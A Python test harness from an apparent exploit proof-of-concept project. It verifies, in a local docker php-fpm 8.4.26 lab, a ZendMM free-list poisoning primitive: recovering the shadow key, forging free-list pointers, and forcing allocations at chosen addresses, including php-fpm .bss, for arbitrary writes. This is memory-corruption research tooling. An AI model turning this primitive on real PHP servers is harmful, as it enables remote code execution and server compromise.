#!/usr/bin/env python3
r"""A/B + reliability harness for the ZendMM free-list in-slot poison
(freelist_slot_poison.py), against a live php-fpm 8.4.26 lab
(docker-compose.fpm-avenues.yml, profile flp, host port 8157).

Lab bring-up / run / teardown (from the repo root):
    docker compose -f docker-compose.fpm-avenues.yml --profile flp up -d --build
    python3 -I poc/primitives/write/verify_freelist_slot_poison.py
    docker compose -f docker-compose.fpm-avenues.yml --profile flp down
(container p2s-flp-fpm; --compose-file/--service already default to this lab.)

Checks:
  MODEL   the pure-Python shadow model matches zend_alloc.c (encode/decode
          round-trip, key recovery), and live decode(shadow)==next on the heap.
  (1) WIN   N correct-shadow poisons each make the next emalloc return the chosen
            address and leave the worker alive (reliability N/N).
  (2) GATE  the same poison with a WRONG shadow -> zend_mm_panic/SIGABRT -> worker
            dies (run on a sacrificial worker the master respawns).
  (3) WRITE an ordinary write into the returned allocation lands at the chosen
            address and reads back verbatim.
  (4) REACH the chosen address can be a far chunk offset and a php-fpm image .bss
            address, a reach bounded only by mapped memory.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


F = _load("freelist_slot_poison", "freelist_slot_poison.py")


# MODEL: standalone math self-check (no container needed).
def check_model():
    ok = True
    key = 0x994560DD63CD8E9F        # a sample recovered key (shape only)
    for nxt in (0x0, 0x727f2bc01140, 0x57ed9c0d8000, 0xDEADBEEFCAFE):
        shadow = F.encode_shadow(nxt, key)
        if F.decode_shadow(shadow, key) != (nxt & F.MASK64):
            print(f"  MODEL FAIL: decode(encode({nxt:#x})) != {nxt:#x}")
            ok = False
        if F.recover_key(nxt, shadow) != key:
            print(f"  MODEL FAIL: recover_key for next={nxt:#x} != key")
            ok = False
    # poison_pair must reproduce the shadow the allocator would check.
    tgt = 0x57ed9c0d8000
    nv, sv = F.poison_pair(tgt, key)
    if nv != tgt or F.decode_shadow(sv, key) != tgt:
        print("  MODEL FAIL: poison_pair inconsistent")
        ok = False
    print(f"  model round-trip (encode/decode/recover/poison): {'OK' if ok else 'FAIL'}")
    return ok


def run(compose_file, service, trials, size, verbose):
    flp = F.FreeListPoison(compose_file, service, size=size, verbose=verbose)
    pids = F.worker_pids(compose_file, service)
    if len(pids) < 2:
        print("need >=2 workers (one sacrificial for the panic negative). Up the lab.")
        return 2
    work_pid = pids[0]
    sacrificial = pids[-1]

    heap = flp.heap_of(work_pid)
    chunk = heap & ~(F.CHUNK_ALIGN - 1)
    maps = F.read_maps(compose_file, service, work_pid)
    binbase = maps.binbase()
    bss = maps.image_bss()

    print("=" * 78)
    print("verify free-list poison -- fpm 8.4.26  (work pid %d, sacrificial %d)"
          % (work_pid, sacrificial))
    print("=" * 78)

    # MODEL -----------------------------------------------------------------
    print("[MODEL] pure-Python shadow model vs zend_alloc.c:")
    model_ok = check_model()

    # (1) WIN reliability ---------------------------------------------------
    print(f"\n[1/WIN] {trials} independent correct-shadow poisons (reliability):")
    wins = alive = 0
    far_dist = None
    for i in range(trials):
        rk = flp.read_shadow_key(work_pid)
        if rk is None:
            print(f"  trial {i}: could not read a bin slot (worker state?)")
            continue
        key, head, _, _ = rk
        # alternate the aim between a near-but->cap and a deep chunk offset.
        target = chunk + (0x100000 + i * 0x20000)   # >=1 MiB forward, varied
        far_dist = target - head
        r = flp.poison_alloc(work_pid, head, target, key,
                             writeback=bytes([0x50, 0x32, i & 0xFF]) + b"FLP")
        wins += 1 if r["returned_chosen"] else 0
        alive += 1 if r["alive"] else 0
        wb_ok = (r["readback"] is not None)
        print(f"  trial {i}: T={target:#x} chosen={r['returned_chosen']} "
              f"alive={r['alive']} wrote_back={wb_ok}")
    print(f"  => returned-chosen {wins}/{trials}, worker-survived {alive}/{trials}")

    # (2) GATE negative -----------------------------------------------------
    print(f"\n[2/GATE] WRONG-shadow poison on sacrificial pid {sacrificial} (expect panic):")
    rk = flp.read_shadow_key(sacrificial)
    gate_ok = False
    if rk:
        key, head, _, _ = rk
        target = (chunk + 0x140000)
        r = flp.poison_alloc(sacrificial, head, target, key, corrupt_shadow=True)
        # success of the GATE = worker died (panic) AND did not hand back T.
        gate_ok = (not r["alive"])
        print(f"  wrong-shadow: alive={r['alive']} panicked={r['panicked']} "
              f"returned_chosen={r['returned_chosen']}  -> gate {'HELD' if gate_ok else '??'}")
    else:
        print("  could not read sacrificial worker slot")

    # (3)/(4) REACH + write-back (libphp .bss) ------------------------------
    print("\n[3+4/REACH] far chunk + php-fpm .bss aim, write-back verified:")
    print(f"  var_hash_rw forward cap          : {F.FORWARD_CAP} B (~16 KiB)")
    if far_dist is not None:
        print(f"  far-chunk distance      : {F._human(far_dist)}  "
              f"({'FAR past' if far_dist > F.FORWARD_CAP else 'within'} the var_hash_rw cap)")
    reach_lib = None
    if bss and binbase:
        rk = flp.read_shadow_key(work_pid)
        if rk:
            key, head, _, _ = rk
            libphp_t = (bss["start"] + bss["end"]) // 2 & ~0xF
            r = flp.poison_alloc(work_pid, head, libphp_t, key, writeback=b"P2SFLPWW")
            dist = abs(libphp_t - chunk)
            reach_lib = r["returned_chosen"] and r["alive"]
            exp = int.from_bytes(b"P2SFLPWW", "little")
            print(f"  libphp .bss T=%#x  (%s from chunk, binbase=%#x)"
                  % (libphp_t, F._human(dist), binbase))
            print(f"    emalloc returned chosen : {r['returned_chosen']}  alive={r['alive']}")
            print(f"    write-back matched       : {r['readback'] == exp} "
                  f"(got {r['readback'] and hex(r['readback'])})")
    else:
        print("  (no php-fpm .bss anon seg found in maps -- skipped)")

    print("\n" + "=" * 78)
    verdict = (model_ok and wins == trials and alive == trials and gate_ok
               and (reach_lib in (None, True)))
    print("VERDICT: %s" % ("ALL PROOFS HELD" if verdict else "see failures above"))
    print("  model=%s  win=%d/%d  survive=%d/%d  gate=%s  libphp_reach=%s"
          % (model_ok, wins, trials, alive, trials, gate_ok, reach_lib))
    print("=" * 78)
    return 0 if verdict else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="A/B + reliability verifier for the free-list poison")
    ap.add_argument("--compose-file", default=F.DEFAULT_COMPOSE)
    ap.add_argument("--service", default=F.DEFAULT_SERVICE)
    ap.add_argument("--port", type=int, default=8157, help="documentation only (nginx front)")
    ap.add_argument("--trials", type=int, default=5)
    ap.add_argument("--size", type=int, default=F.DEFAULT_ALLOC_SIZE)
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation for the imported helper module (F).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-flp"
    os.environ["COMPOSE_PROFILES"] = "flp"
    return run(a.compose_file, a.service, a.trials, a.size, a.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
